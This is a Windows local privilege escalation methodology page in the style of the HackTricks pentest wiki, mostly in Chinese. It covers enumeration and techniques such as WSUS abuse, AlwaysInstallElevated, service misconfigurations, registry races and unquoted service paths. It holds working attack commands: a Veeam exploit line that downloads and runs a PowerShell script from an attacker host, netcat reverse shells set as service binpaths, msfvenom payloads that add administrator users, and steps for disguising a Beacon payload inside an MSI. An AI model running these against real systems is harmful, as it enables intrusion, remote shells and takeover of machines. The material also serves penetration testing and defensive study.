# Windows 本地权限提升

{{#include ../../banners/hacktricks-training.md}}

### **查找 Windows 本地权限提升向量的最佳工具：** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Windows 初始理论

### Access Tokens

**如果你不知道什么是 Windows Access Tokens，请在继续前先阅读以下页面：**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**有关 ACLs - DACLs/SACLs/ACEs 的更多信息，请查看以下页面：**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**如果你不知道 Windows 中的 integrity levels，你应在继续前先阅读以下页面：**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows 安全控制

Windows 中有不同的东西可能会**阻止你枚举系统**、运行可执行文件，甚至**检测你的活动**。在开始权限提升枚举之前，你应该**阅读**以下**页面**并**枚举**所有这些**防御****机制**：


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

### Admin Protection / UIAccess silent elevation

通过 `RAiLaunchAdminProcess` 启动的 UIAccess 进程，在绕过 AppInfo secure-path 检查后，可以被滥用以在不提示的情况下到达 High IL。这里查看专门的 UIAccess/Admin Protection bypass 流程：

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Secure Desktop accessibility registry propagation 也可被滥用，实现任意 SYSTEM registry 写入（RegPwn）：

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

近期的 Windows build 还引入了一条 **SMB arbitrary-port** LPE 路径，其中特权本地 NTLM authentication 会通过复用的 SMB TCP connection 被反射：

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## System Info

### Version info enumeration

检查 Windows version 是否存在任何已知漏洞（也要检查已应用的 patches）。
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Version Exploits

这个 [site](https://msrc.microsoft.com/update-guide/vulnerability) 很适合用来搜索 Microsoft security vulnerabilities 的详细信息。这个数据库包含超过 4,700 个 security vulnerabilities，显示了 Windows 环境所暴露出的**massive attack surface**。

**On the system**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas has watson embedded)_

**Locally with system information**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github repos of exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Environment

环境变量里有没有保存任何 credential/Juicy info？
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShell History
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell Transcript files

你可以在 [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/) 学习如何启用它
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell 模块日志

PowerShell 管道执行的详细信息会被记录，包括已执行的命令、命令调用以及脚本的一部分。不过，完整的执行细节和输出结果可能不会被捕获。

要启用此功能，请按照文档中 "Transcript files" 部分的说明进行操作，并选择 **"Module Logging"** 而不是 **"Powershell Transcription"**。
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
要查看 PowersShell logs 中的最后 15 个事件，你可以执行：
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

脚本执行的完整活动和完整内容记录会被捕获，确保在代码运行时每个代码块都被记录。这个过程保留了每次活动的全面审计轨迹，对取证和分析恶意行为很有价值。通过在执行时记录所有活动，可以提供对该过程的详细洞察。
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Script Block 的日志事件可以在 Windows Event Viewer 中找到，路径为：**Application and Services Logs > Microsoft > Windows > PowerShell > Operational**。\
要查看最近 20 条事件，可以使用：
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Internet Settings
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### 驱动器
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

如果更新不是通过 http**S** 而是通过 http 请求，则你可以入侵该系统。

你可以先在 cmd 中运行以下命令，检查该网络是否使用非 SSL 的 WSUS 更新：
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
或者在 PowerShell 中：
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
如果你收到如下回复之一：
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
And if `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` or `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` 的值等于 `1`。

Then, **it is exploitable.** 如果最后一个 registry 的值等于 0，那么 WSUS 条目将被忽略。

为了利用这个漏洞，你可以使用这样的工具：[Wsuxploit](https://github.com/pimps/wsuxploit)、[pyWSUS ](https://github.com/GoSecure/pywsus)- 这些是用于 MiTM weaponized exploits scripts，用来向非 SSL 的 WSUS traffic 注入“fake” updates。

Read the research here:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**在这里阅读完整报告**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
基本上，这就是这个 bug 利用的 flaw：

> 如果我们有能力修改本地用户 proxy，而 Windows Updates 使用的是 Internet Explorer settings 中配置的 proxy，那么我们就有能力在本地运行 [PyWSUS](https://github.com/GoSecure/pywsus) 来 intercept 我们自己的 traffic，并以资产上的 elevated user 身份运行 code。
>
> 此外，由于 WSUS service 使用当前 user 的 settings，它也会使用它的 certificate store。如果我们为 WSUS hostname 生成一个 self-signed certificate，并将该 certificate 添加到当前 user 的 certificate store 中，我们就能够同时 intercept HTTP 和 HTTPS WSUS traffic。WSUS 不使用类似 HSTS 的机制来对 certificate 执行 trust-on-first-use 类型的验证。如果提供的 certificate 被 user 信任且具有正确的 hostname，它将被该 service 接受。

你可以使用工具 [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) 来利用这个漏洞（once it's liberated）。

## Third-Party Auto-Updaters and Agent IPC (local privesc)

Many enterprise agents expose a localhost IPC surface and a privileged update channel. If enrollment can be coerced to an attacker server and the updater trusts a rogue root CA or weak signer checks, a local user can deliver a malicious MSI that the SYSTEM service installs. See a generalized technique (based on the Netskope stAgentSvc chain – CVE-2025-0309) here:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM via TCP 9401)

Veeam B&R < `11.0.1.1261` exposes a localhost service on **TCP/9401** that processes attacker-controlled messages, allowing arbitrary commands as **NT AUTHORITY\SYSTEM**.

- **Recon**: confirm the listener and version, e.g., `netstat -ano | findstr 9401` and `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.
- **Exploit**: place a PoC such as `VeeamHax.exe` with the required Veeam DLLs in the same directory, then trigger a SYSTEM payload over the local socket:
```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```
该服务以 SYSTEM 身份执行命令。
## KrbRelayUp

在 Windows **domain** 环境中，存在一个 **local privilege escalation** 漏洞，且需满足特定条件。这些条件包括：环境中未强制启用 **LDAP signing**、用户拥有可配置 **Resource-Based Constrained Delegation (RBCD)** 的自权限，以及用户能够在域中创建 computer。需要注意的是，这些 **requirements** 在 **default settings** 下即可满足。

在 [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp) 中查找 **exploit**

有关攻击流程的更多信息，请查看 [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**如果**这 2 个 registers 都被 **enabled**（value 为 **0x1**），那么任何权限级别的用户都可以将 `*.msi` 文件 **install**（execute）为 NT AUTHORITY\\**SYSTEM**。
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
If you have a meterpreter session you can automate this technique using the module **`exploit/windows/local/always_install_elevated`**

### PowerUP

Use the `Write-UserAddMSI` command from power-up to create inside the current directory a Windows MSI binary to escalate privileges. This script writes out a precompiled MSI installer that prompts for a user/group addition (so you will need GIU access):
```
Write-UserAddMSI
```
只需执行创建的 binary 即可提升权限。

### MSI Wrapper

阅读本教程，了解如何使用此工具创建一个 MSI wrapper。注意，你可以包装一个 "**.bat**" 文件，如果你**只是**想要**执行** **command lines**


{{#ref}}
msi-wrapper.md
{{#endref}}

### 使用 WIX 创建 MSI


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### 使用 Visual Studio 创建 MSI

- **Generate** with Cobalt Strike or Metasploit a **new Windows EXE TCP payload** in `C:\privesc\beacon.exe`
- 打开 **Visual Studio**，选择 **Create a new project**，然后在搜索框中输入 "installer"。选择 **Setup Wizard** 项目并点击 **Next**。
- 给项目起一个名字，例如 **AlwaysPrivesc**，使用 **`C:\privesc`** 作为位置，选择 **place solution and project in the same directory**，然后点击 **Create**。
- 一直点击 **Next**，直到到达第 3/4 步（choose files to include）。点击 **Add** 并选择你刚生成的 Beacon payload。然后点击 **Finish**。
- 在 **Solution Explorer** 中高亮 **AlwaysPrivesc** 项目，然后在 **Properties** 中将 **TargetPlatform** 从 **x86** 改为 **x64**。
- 你还可以更改其他属性，例如 **Author** 和 **Manufacturer**，这可以让已安装的 app 看起来更合法。
- 右键点击项目并选择 **View > Custom Actions**。
- 右键点击 **Install** 并选择 **Add Custom Action**。
- 双击 **Application Folder**，选择你的 **beacon.exe** 文件并点击 **OK**。这将确保在安装程序运行后立即执行 beacon payload。
- 在 **Custom Action Properties** 下，将 **Run64Bit** 改为 **True**。
- 最后，**build it**。
- 如果显示警告 `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'`，请确保将 platform 设置为 x64。

### MSI Installation

要在 **background** 中执行恶意 `.msi` 文件的 **installation**：
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
要利用此漏洞，你可以使用：_exploit/windows/local/always_install_elevated_

## Antivirus and Detectors

### Audit Settings

这些设置决定了什么内容会被**记录**，所以你应该注意
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding，了解日志发送到哪里是很有用的
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** 旨在用于**管理本地 Administrator 密码**，确保每台加入域的计算机上的每个密码都**唯一、随机化，并定期更新**。这些密码会安全地存储在 Active Directory 中，并且只能由通过 ACL 被授予足够权限的用户访问，从而在被授权时查看本地 admin 密码。


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

如果处于激活状态，**明文密码会存储在 LSASS**（Local Security Authority Subsystem Service）中。\
[**有关 WDigest 的更多信息见此页**](../stealing-credentials/credentials-protections.md#wdigest)。
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

从 **Windows 8.1** 开始，Microsoft 为 Local Security Authority (LSA) 引入了增强保护，以**阻止**不受信任的进程**读取其内存**或注入代码，从而进一步保护系统。\
[**更多关于 LSA Protection 的信息请看这里**](../stealing-credentials/credentials-protections.md#lsa-protection)。
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** 是在 **Windows 10** 中引入的。其目的是保护设备上存储的凭据，防御诸如 pass-the-hash 攻击之类的威胁。| [**More info about Credentials Guard here.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### 缓存凭据

**域凭据** 由 **Local Security Authority** (LSA) 进行认证，并被操作系统组件使用。当用户的登录数据被已注册的安全包认证后，通常会为该用户建立域凭据。\
[**More info about Cached Credentials here**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## 用户与组

### 枚举用户与组

你应该检查你所属的任何组是否拥有有趣的权限
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### 特权组

如果你**属于某些特权组，你可能能够提权**。在这里了解特权组以及如何滥用它们来提权：


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token 操作

**了解更多**关于什么是**token**，请看这个页面：[**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens)。\
查看以下页面，**了解有趣的 token** 以及如何滥用它们：


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### 已登录用户 / Sessions
```bash
qwinsta
klist sessions
```
### Home folders
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### 密码策略
```bash
net accounts
```
### 获取剪贴板内容
```bash
powershell -command "Get-Clipboard"
```
## 运行中的进程

### 文件和文件夹权限

首先，列出进程时，**检查进程命令行中是否包含密码**。\
检查你是否可以**覆盖某个正在运行的二进制文件**，或者是否对该二进制文件所在的文件夹具有写权限，以利用可能的 [**DLL Hijacking attacks**](dll-hijacking/index.html)：
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Always check for possible [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**检查进程二进制文件的权限**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**检查进程二进制文件所在文件夹的权限（**[**DLL Hijacking**](dll-hijacking/index.html)**）**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### 内存密码挖掘

你可以使用来自 sysinternals 的 **procdump** 对正在运行的进程创建内存转储。像 FTP 这样的服务会把**凭证以明文形式存储在内存中**，尝试转储内存并读取这些凭证。
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### 不安全的 GUI apps

**以 SYSTEM 运行的 Applications 可能允许 user 打开 CMD，或浏览目录。**

示例: "Windows Help and Support" (Windows + F1), 搜索 "command prompt", 点击 "Click to open Command Prompt"

## Services

Service Triggers 允许 Windows 在某些条件发生时启动一个 service（named pipe/RPC endpoint activity, ETW events, IP availability, device arrival, GPO refresh, etc.）。即使没有 SERVICE_START 权限，你通常也可以通过触发它们的 triggers 来启动有权限的 services。有关枚举和激活 techniques，见这里：

-
{{#ref}}
service-triggers.md
{{#endref}}

获取 services 列表：
```bash
net start
wmic service list brief
sc query
Get-Service
```
### 权限

你可以使用 **sc** 来获取服务的信息
```bash
sc qc <service_name>
```
建议使用 _Sysinternals_ 的二进制文件 **accesschk** 来检查每个服务所需的权限级别。
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
建议检查 “Authenticated Users” 是否可以修改任何 service：
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[你可以在这里下载用于 XP 的 accesschk.exe](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### 启用 service

如果你遇到这个错误（例如使用 SSDPSRV 时）：

_System error 1058 has occurred._\
_The service cannot be started, either because it is disabled or because it has no enabled devices associated with it._

你可以使用以下方式启用它
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**请注意，服务 upnphost 依赖 SSDPSRV 才能工作（针对 XP SP1）**

**这个问题的另一种变通方法**是运行：
```
sc.exe config usosvc start= auto
```
### **修改服务二进制路径**

在 “Authenticated users” 组对某个服务拥有 **SERVICE_ALL_ACCESS** 的场景下，可以修改该服务的可执行二进制文件。要修改并执行 **sc**：
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### 重启 service
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
可以通过各种权限进行提权：

- **SERVICE_CHANGE_CONFIG**：允许重新配置服务二进制文件。
- **WRITE_DAC**：启用权限重新配置，从而能够更改服务配置。
- **WRITE_OWNER**：允许获取所有权并重新配置权限。
- **GENERIC_WRITE**：继承更改服务配置的能力。
- **GENERIC_ALL**：也继承更改服务配置的能力。

对于此漏洞的检测与利用，可以使用 _exploit/windows/local/service_permissions_。

### Services binaries weak permissions

如果某个 service 以 **`LocalSystem`**、**`LocalService`**、**`NetworkService`** 或某个特权域账户运行，但**低权限用户可以修改该 service 的 EXE 或其父目录**，那么通常可以通过**替换二进制文件并重启 service**来劫持它。

**检查你是否可以修改由 service 执行的 binary**，或者你是否对该 binary 所在的 folder 具有**写权限**（[**DLL Hijacking**](dll-hijacking/index.html)）**。**\
你可以使用 **wmic** 获取所有由 service 执行的 binary（不在 system32 中），并使用 **icacls** 检查你的权限：
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
你也可以使用 **sc** 和 **icacls**：
```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
查找授予 **`Everyone`**、**`BUILTIN\Users`** 或 **`Authenticated Users`** 的危险 ACL，尤其是服务可执行文件或其所在目录上的 **`(F)`**、**`(M)`** 或 **`(W)`**。一个实际的利用流程是：

1. 使用 `sc qc <service_name>` 确认服务账户和可执行文件路径。
2. 使用 `icacls <path>` 确认二进制文件可写。
3. 用 payload 或一个有效的恶意 service binary 替换服务二进制文件。
4. 使用 `sc stop <service_name> && sc start <service_name>` 重启服务（或者等待重启 / service trigger）。

Useful automated checks:
```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```
> 如果该服务不允许普通用户重启它，检查它是否在启动时自动启动，是否有失败操作会重新启动它，或者是否可以被使用它的应用程序间接触发。

### Services registry modify permissions

你应该检查是否可以修改任何 service registry。\
你可以通过以下方式**检查**你对某个 service **registry** 的**权限**：
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
应检查 **Authenticated Users** 或 **NT AUTHORITY\INTERACTIVE** 是否拥有 `FullControl` 权限。如果有，服务执行的二进制文件就可以被修改。

要更改所执行二进制文件的 Path：
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Registry symlink race to arbitrary HKLM value write (ATConfig)

一些 Windows Accessibility 功能会创建按用户的 **ATConfig** keys，之后会被一个 **SYSTEM** process 复制到一个 HKLM session key。通过 registry **symbolic link race**，可以把这次特权写入重定向到 **任何 HKLM path**，从而获得任意 HKLM **value write** primitive。

Key locations (example: On-Screen Keyboard `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` 列出已安装的 accessibility features。
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` 存储用户可控的 configuration。
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` 会在 logon/secure-desktop transitions 期间创建，并且用户可写。

Abuse flow (CVE-2026-24291 / ATConfig):

1. 填充你希望由 SYSTEM 写入的 **HKCU ATConfig** value。
2. 触发 secure-desktop copy（例如 **LockWorkstation**），这会启动 AT broker flow。
3. 通过在 `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml` 上放置一个 **oplock** 来 **赢得 race**；当 oplock 触发时，将 **HKLM Session ATConfig** key 替换为指向受保护 HKLM target 的 **registry link**。
4. SYSTEM 将攻击者选择的 value 写入被重定向的 HKLM path。

一旦获得任意 HKLM value write，就可以通过覆盖 service configuration values 来 pivot 到 LPE：

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/command line)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

选择一个普通用户可以启动的 service（例如 **`msiserver`**），在写入后触发它。**Note:** public exploit implementation 会在 race 过程中 **lock the workstation**。

Example tooling (RegPwn BOF / standalone):
```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```
### Services registry AppendData/AddSubdirectory permissions

If you have this permission over a registry this means to **you can create sub registries from this one**. In case of Windows services this is **enough to execute arbitrary code:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

If the path to an executable is not inside quotes, Windows will try to execute every ending before a space.

For example, for the path _C:\Program Files\Some Folder\Service.exe_ Windows will try to execute:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
列出所有未加引号的 service paths，排除属于内置 Windows services 的那些：
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**你可以检测并利用** 这个漏洞，使用 metasploit: `exploit/windows/local/trusted\_service\_path` 你可以手动使用 metasploit 创建一个 service binary:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### 恢复操作

Windows 允许用户指定当服务失败时要执行的操作。此功能可以配置为指向一个二进制文件。如果这个二进制文件可被替换，可能可以进行权限提升。更多细节可在[official documentation](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>)中找到。

## Applications

### Installed Applications

检查二进制文件的**权限**（也许你可以覆盖其中一个并提升权限）以及**文件夹**的权限（[DLL Hijacking](dll-hijacking/index.html)）。
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### 写权限

检查你是否可以修改某个配置文件以读取某个特殊文件，或者是否可以修改某个将由 Administrator 账户执行的二进制文件（schedtasks）。

查找系统中弱文件夹/文件权限的一种方法是：
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
